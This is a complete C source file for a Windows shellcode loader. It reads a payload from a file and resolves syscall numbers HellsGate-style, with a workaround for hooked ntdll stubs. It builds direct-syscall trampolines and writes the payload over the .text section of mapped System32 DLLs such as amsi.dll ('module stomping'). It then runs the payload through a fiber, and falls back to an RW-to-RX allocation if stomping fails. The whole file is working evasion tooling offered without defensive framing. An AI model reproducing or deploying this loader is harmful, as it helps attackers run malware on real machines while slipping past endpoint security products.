#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/* ------------------------------------------------------------------ */
/* NTSTATUS / status codes                                             */
/* ------------------------------------------------------------------ */
#ifndef NT_SUCCESS
#define NT_SUCCESS(s) (((NTSTATUS)(s)) >= 0)
#endif
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif
#ifndef STATUS_INVALID_HANDLE
#define STATUS_INVALID_HANDLE ((NTSTATUS)0xC0000008L)
#endif
#ifndef STATUS_INVALID_PAGE_PROTECTION
#define STATUS_INVALID_PAGE_PROTECTION ((NTSTATUS)0xC0000045L)
#endif

/* Section / view constants (self-contained, do not rely on winternl.h) */
#ifndef SEC_IMAGE
#define SEC_IMAGE 0x01000000
#endif
#ifndef SEC_COMMIT
#define SEC_COMMIT 0x08000000
#endif
#ifndef SECTION_MAP_READ
#define SECTION_MAP_READ 0x0004
#endif
#ifndef SECTION_MAP_WRITE
#define SECTION_MAP_WRITE 0x0002
#endif
#ifndef SECTION_MAP_EXECUTE
#define SECTION_MAP_EXECUTE 0x0008
#endif
#ifndef ViewShare
#define ViewShare 1
#endif
#ifndef ViewUnmap
#define ViewUnmap 2
#endif

/* ------------------------------------------------------------------ */
/* Minimal NT type declarations                                        */
/* ------------------------------------------------------------------ */
typedef struct _MY_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} MY_UNICODE_STRING;

typedef struct _MY_OBJECT_ATTRIBUTES {
    ULONG               Length;
    HANDLE              RootDirectory;
    MY_UNICODE_STRING  *ObjectName;
    ULONG               Attributes;
    PVOID               SecurityDescriptor;
    PVOID               SecurityQualityOfService;
} MY_OBJECT_ATTRIBUTES;

/* ------------------------------------------------------------------ */
/* SSN resolver (HellsGate-style)                                      */
/* ------------------------------------------------------------------ */
typedef struct _SSN_ENTRY {
    const char *name;
    DWORD       ssn;
} SSN_ENTRY;

static SSN_ENTRY g_ssn_table[] = {
    { "NtAllocateVirtualMemory", 0 },
    { "NtProtectVirtualMemory",  0 },
    { "NtCreateSection",         0 },
    { "NtMapViewOfSection",      0 },
    { "NtUnmapViewOfSection",    0 },
    { "NtClose",                 0 },
    { NULL, 0 }
};

static BOOL resolve_ssn(const char *func_name, DWORD *out_ssn)
{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return FALSE;

    BYTE *base = (BYTE *)ntdll;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    IMAGE_DATA_DIRECTORY *exp_dir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!exp_dir->VirtualAddress) return FALSE;

    IMAGE_EXPORT_DIRECTORY *exp =
        (IMAGE_EXPORT_DIRECTORY *)(base + exp_dir->VirtualAddress);

    DWORD *names    = (DWORD *)(base + exp->AddressOfNames);
    WORD  *ordinals = (WORD  *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs    = (DWORD *)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        const char *name = (const char *)(base + names[i]);
        if (strcmp(name, func_name) != 0) continue;

        BYTE *stub = base + funcs[ordinals[i]];

        /* Clean stub: 4C 8B D1 B8 <imm32> */
        if (stub[0] == 0x4C && stub[1] == 0x8B &&
            stub[2] == 0xD1 && stub[3] == 0xB8) {
            DWORD ssn;
            memcpy(&ssn, stub + 4, sizeof(ssn));
            *out_ssn = ssn;
            return TRUE;
        }

        /* Hooked stub fallback: scan for syscall (0F 05), then walk back
           to the nearest mov eax, imm32 (B8) and read the imm. */
        for (int k = 0; k < 31; k++) {
            if (stub[k] == 0x0F && stub[k + 1] == 0x05) {
                for (int j = k - 8; j >= 0; j--) {
                    if (stub[j] == 0xB8) {
                        DWORD ssn;
                        memcpy(&ssn, stub + j + 1, sizeof(ssn));
                        *out_ssn = ssn;
                        return TRUE;
                    }
                }
                break;
            }
        }
        return FALSE;
    }
    return FALSE;
}

static BOOL resolve_all_ssns(void)
{
    for (int i = 0; g_ssn_table[i].name != NULL; i++) {
        if (!resolve_ssn(g_ssn_table[i].name, &g_ssn_table[i].ssn)) {
            fprintf(stderr, "SSN resolve failed for %s\n", g_ssn_table[i].name);
            return FALSE;
        }
        if (g_ssn_table[i].ssn == 0xFFFFFFFF) {
            fprintf(stderr, "SSN for %s is 0xFFFFFFFF\n", g_ssn_table[i].name);
            return FALSE;
        }
    }
    return TRUE;
}

static DWORD get_ssn(const char *name)
{
    for (int i = 0; g_ssn_table[i].name != NULL; i++) {
        if (strcmp(g_ssn_table[i].name, name) == 0)
            return g_ssn_table[i].ssn;
    }
    return 0xFFFFFFFF;
}

/* ------------------------------------------------------------------ */
/* Direct-syscall trampolines                                          */
/* ------------------------------------------------------------------ */
typedef NTSTATUS (NTAPI *pfn_NtAllocateVirtualMemory)(
    HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pfn_NtProtectVirtualMemory)(
    HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI *pfn_NtCreateSection)(
    PHANDLE, ACCESS_MASK, PVOID /*POBJECT_ATTRIBUTES*/, PLARGE_INTEGER,
    ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI *pfn_NtMapViewOfSection)(
    HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PLARGE_INTEGER,
    PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pfn_NtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS (NTAPI *pfn_NtClose)(HANDLE);

static pfn_NtAllocateVirtualMemory g_NtAllocateVirtualMemory = NULL;
static pfn_NtProtectVirtualMemory  g_NtProtectVirtualMemory  = NULL;
static pfn_NtCreateSection         g_NtCreateSection         = NULL;
static pfn_NtMapViewOfSection      g_NtMapViewOfSection      = NULL;
static pfn_NtUnmapViewOfSection    g_NtUnmapViewOfSection    = NULL;
static pfn_NtClose                 g_NtClose                 = NULL;

static void *build_trampoline(DWORD ssn)
{
    BYTE *mem = (BYTE *)VirtualAlloc(NULL, 4096,
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_READWRITE);
    if (!mem) return NULL;

    BYTE stub[16];
    DWORD n = 0;
    stub[n++] = 0x4C; stub[n++] = 0x8B; stub[n++] = 0xD1;   /* mov r10, rcx */
    stub[n++] = 0xB8;                                        /* mov eax, imm32 */
    memcpy(stub + n, &ssn, sizeof(ssn)); n += sizeof(ssn);
    stub[n++] = 0x0F; stub[n++] = 0x05;                      /* syscall */
    stub[n++] = 0xC3;                                        /* ret */

    memcpy(mem, stub, n);

    DWORD old = 0;
    if (!VirtualProtect(mem, 4096, PAGE_EXECUTE_READ, &old)) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return NULL;
    }
    return mem;
}

static BOOL build_all_trampolines(void)
{
    DWORD ssn;

    ssn = get_ssn("NtAllocateVirtualMemory");
    if (ssn == 0xFFFFFFFF) return FALSE;
    g_NtAllocateVirtualMemory = (pfn_NtAllocateVirtualMemory)build_trampoline(ssn);

    ssn = get_ssn("NtProtectVirtualMemory");
    if (ssn == 0xFFFFFFFF) return FALSE;
    g_NtProtectVirtualMemory = (pfn_NtProtectVirtualMemory)build_trampoline(ssn);

    ssn = get_ssn("NtCreateSection");
    if (ssn == 0xFFFFFFFF) return FALSE;
    g_NtCreateSection = (pfn_NtCreateSection)build_trampoline(ssn);

    ssn = get_ssn("NtMapViewOfSection");
    if (ssn == 0xFFFFFFFF) return FALSE;
    g_NtMapViewOfSection = (pfn_NtMapViewOfSection)build_trampoline(ssn);

    ssn = get_ssn("NtUnmapViewOfSection");
    if (ssn == 0xFFFFFFFF) return FALSE;
    g_NtUnmapViewOfSection = (pfn_NtUnmapViewOfSection)build_trampoline(ssn);

    ssn = get_ssn("NtClose");
    if (ssn == 0xFFFFFFFF) return FALSE;
    g_NtClose = (pfn_NtClose)build_trampoline(ssn);

    return g_NtAllocateVirtualMemory && g_NtProtectVirtualMemory &&
           g_NtCreateSection && g_NtMapViewOfSection &&
           g_NtUnmapViewOfSection && g_NtClose;
}

/* ------------------------------------------------------------------ */
/* Helpers                                                             */
/* ------------------------------------------------------------------ */
static BOOL find_text_section(BYTE *image_base, DWORD *out_rva, DWORD *out_size)
{
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)image_base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(image_base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) == 0) {
            *out_rva = sec->VirtualAddress;
            *out_size = sec->Misc.VirtualSize;
            return TRUE;
        }
    }
    return FALSE;
}

/* Map a DLL as a proper SEC_IMAGE section, then remap the view as
   PAGE_READWRITE so we can stomp .text. Returns the view base. */
static BYTE *map_image_section_rw(const wchar_t *dll_path, SIZE_T *out_size)
{
    /* 1. Open the file read-only. */
    HANDLE hFile = CreateFileW(dll_path,
                               GENERIC_READ,
                               FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                               NULL,
                               OPEN_EXISTING,
                               FILE_ATTRIBUTE_NORMAL,
                               NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "CreateFileW(%ws) failed: %lu\n",
                dll_path, GetLastError());
        return NULL;
    }

    /* 2. Create an UNNAMED image section backed by that file.
          ObjectName = NULL, MaximumSize = NULL, AllocationAttributes = SEC_IMAGE.
          SectionPageProtection must be compatible with an image section;
          PAGE_EXECUTE_READWRITE is the safest choice for a later writable view. */
    HANDLE hSection = NULL;
    NTSTATUS st = g_NtCreateSection(
        &hSection,
        SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
        NULL,                       /* ObjectAttributes = NULL (unnamed) */
        NULL,                       /* MaximumSize = NULL (derive from file) */
        PAGE_EXECUTE_READWRITE,     /* SectionPageProtection (image-compatible) */
        SEC_IMAGE,                  /* AllocationAttributes */
        hFile);
    CloseHandle(hFile);

    if (!NT_SUCCESS(st) || hSection == NULL) {
        fprintf(stderr, "NtCreateSection(SEC_IMAGE) failed: 0x%08lX\n",
                (unsigned long)st);
        return NULL;
    }

    /* 3. Map the section into our process with a writable view. */
    PVOID view = NULL;
    SIZE_T view_size = 0;                 /* 0 => map entire section */
    LARGE_INTEGER section_offset = {0};   /* proper zeroed LARGE_INTEGER */

    st = g_NtMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &view,
        0,                                /* ZeroBits */
        0,                                /* CommitSize */
        &section_offset,                  /* SectionOffset (zeroed LARGE_INTEGER) */
        &view_size,                       /* ViewSize (in/out, 0 on input) */
        ViewUnmap,                        /* InheritDisposition */
        0,                                /* AllocationType = 0 for image sections */
        PAGE_READWRITE);                  /* Win32Protect (writable view for stomp) */
    g_NtClose(hSection);

    if (!NT_SUCCESS(st) || view == NULL) {
        fprintf(stderr, "NtMapViewOfSection failed: 0x%08lX\n",
                (unsigned long)st);
        return NULL;
    }

    /* 4. Sanity check: mapped view must carry a valid PE signature. */
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)view;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        fprintf(stderr, "mapped view has no MZ signature\n");
        g_NtUnmapViewOfSection(GetCurrentProcess(), view);
        return NULL;
    }
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)((BYTE *)view + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        fprintf(stderr, "mapped view has no PE signature\n");
        g_NtUnmapViewOfSection(GetCurrentProcess(), view);
        return NULL;
    }

    *out_size = view_size;
    return (BYTE *)view;
}

/* ------------------------------------------------------------------ */
/* Fiber execution                                                     */
/* ------------------------------------------------------------------ */
typedef void (*shellcode_fn)(void);

static VOID CALLBACK fiber_proc(LPVOID param)
{
    shellcode_fn fn = (shellcode_fn)param;
    fn();
    for (;;) SwitchToFiber(GetCurrentFiber());
}

/* ------------------------------------------------------------------ */
/* Fallback: RW -> RX allocation via NT trampolines                    */
/* ------------------------------------------------------------------ */
static BYTE *stage_rw_rx(const unsigned char *sc, SIZE_T sc_size, SIZE_T *out_size)
{
    PVOID base = NULL;
    SIZE_T region = sc_size;
    NTSTATUS st = g_NtAllocateVirtualMemory(GetCurrentProcess(),
                                            &base,
                                            0,
                                            &region,
                                            MEM_COMMIT | MEM_RESERVE,
                                            PAGE_READWRITE);
    if (!NT_SUCCESS(st) || base == NULL) {
        fprintf(stderr, "NtAllocateVirtualMemory failed: 0x%08lX\n",
                (unsigned long)st);
        return NULL;
    }

    memcpy(base, sc, sc_size);

    PVOID prot_base = base;
    SIZE_T prot_size = sc_size;
    ULONG old_prot = 0;
    st = g_NtProtectVirtualMemory(GetCurrentProcess(),
                                  &prot_base,
                                  &prot_size,
                                  PAGE_EXECUTE_READ,
                                  &old_prot);
    if (!NT_SUCCESS(st)) {
        fprintf(stderr, "NtProtectVirtualMemory failed: 0x%08lX\n",
                (unsigned long)st);
        g_NtUnmapViewOfSection(GetCurrentProcess(), base);
        return NULL;
    }

    *out_size = sc_size;
    return (BYTE *)base;
}

/* ------------------------------------------------------------------ */
/* main                                                                */
/* ------------------------------------------------------------------ */
int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <shellcode.bin>\n", argv[0]);
        return 1;
    }

    /* --- 1. Read shellcode file ---------------------------------- */
    FILE *fp = fopen(argv[1], "rb");
    if (!fp) { fprintf(stderr, "fopen failed\n"); return 1; }
    if (fseek(fp, 0, SEEK_END) != 0) { fclose(fp); return 1; }
    long sc_size_l = ftell(fp);
    if (sc_size_l <= 0) { fclose(fp); return 1; }
    if (fseek(fp, 0, SEEK_SET) != 0) { fclose(fp); return 1; }

    unsigned char *shellcode = (unsigned char *)malloc((size_t)sc_size_l);
    if (!shellcode) { fclose(fp); return 1; }
    size_t rd = fread(shellcode, 1, (size_t)sc_size_l, fp);
    fclose(fp);
    if (rd != (size_t)sc_size_l) { free(shellcode); return 1; }
    SIZE_T sc_size = (SIZE_T)sc_size_l;

    /* --- 2. Resolve SSNs and build trampolines ------------------- */
    if (!resolve_all_ssns()) {
        fprintf(stderr, "SSN resolution failed\n");
        free(shellcode);
        return 1;
    }
    if (!build_all_trampolines()) {
        fprintf(stderr, "trampoline build failed\n");
        free(shellcode);
        return 1;
    }

    /* --- 2b. Smoke test: NtClose(NULL) -> STATUS_INVALID_HANDLE. */
    {
        NTSTATUS smoke = g_NtClose(NULL);
        if (smoke != STATUS_INVALID_HANDLE) {
            fprintf(stderr, "trampoline smoke test failed: 0x%08lX\n",
                    (unsigned long)smoke);
            free(shellcode);
            return 1;
        }
    }

    /* --- 3. Try module stomping via SEC_IMAGE. ------------------- */
    BYTE *exec_base = NULL;
    SIZE_T exec_region_size = 0;
    BOOL mapped_image = FALSE;

    /* Standard System32 DLLs only; no hardcoded user/versioned paths. */
    const wchar_t *candidates[] = {
        L"C:\\Windows\\System32\\amsi.dll",
        L"C:\\Windows\\System32\\version.dll",
        L"C:\\Windows\\System32\\winhttp.dll",
        NULL
    };

    for (int i = 0; candidates[i] != NULL && !mapped_image; i++) {
        SIZE_T view_size = 0;
        BYTE *view = map_image_section_rw(candidates[i], &view_size);
        if (!view) continue;

        DWORD text_rva = 0, text_size = 0;
        if (!find_text_section(view, &text_rva, &text_size)) {
            fprintf(stderr, ".text not found in %ws\n", candidates[i]);
            g_NtUnmapViewOfSection(GetCurrentProcess(), view);
            continue;
        }
        if (sc_size > (SIZE_T)text_size) {
            fprintf(stderr, "shellcode too large for %ws .text (%llu > %lu)\n",
                    candidates[i],
                    (unsigned long long)sc_size,
                    (unsigned long)text_size);
            g_NtUnmapViewOfSection(GetCurrentProcess(), view);
            continue;
        }

        BYTE *text_base = view + text_rva;
        memcpy(text_base, shellcode, sc_size);

        PVOID prot_base = (PVOID)text_base;
        SIZE_T prot_size = sc_size;
        ULONG old_prot = 0;
        NTSTATUS st = g_NtProtectVirtualMemory(GetCurrentProcess(),
                                               &prot_base,
                                               &prot_size,
                                               PAGE_EXECUTE_READ,
                                               &old_prot);
        if (!NT_SUCCESS(st)) {
            fprintf(stderr, "NtProtectVirtualMemory on %ws .text failed: 0x%08lX\n",
                    candidates[i], (unsigned long)st);
            g_NtUnmapViewOfSection(GetCurrentProcess(), view);
            continue;
        }

        exec_base = text_base;
        exec_region_size = sc_size;
        mapped_image = TRUE;
        fprintf(stderr, "stomped %ws .text @ %p\n", candidates[i], text_base);
    }

    /* --- 4. Fallback: RW->RX private allocation. ----------------- */
    if (!mapped_image) {
        fprintf(stderr, "image stomping unavailable, using RW->RX fallback\n");
        exec_base = stage_rw_rx(shellcode, sc_size, &exec_region_size);
        if (!exec_base) {
            fprintf(stderr, "fallback staging failed\n");
            free(shellcode);
            return 1;
        }
    }

    free(shellcode);

    /* --- 5. Execute via fiber. ----------------------------------- */
    if (!ConvertThreadToFiber(NULL)) {
        fprintf(stderr, "ConvertThreadToFiber failed: %lu\n", GetLastError());
        return 1;
    }

    LPVOID fiber = CreateFiber(0, fiber_proc, (LPVOID)exec_base);
    if (!fiber) {
        fprintf(stderr, "CreateFiber failed: %lu\n", GetLastError());
        ConvertFiberToThread();
        return 1;
    }

    SwitchToFiber(fiber);

    DeleteFiber(fiber);
    ConvertFiberToThread();

    (void)exec_region_size;
    return 0;
}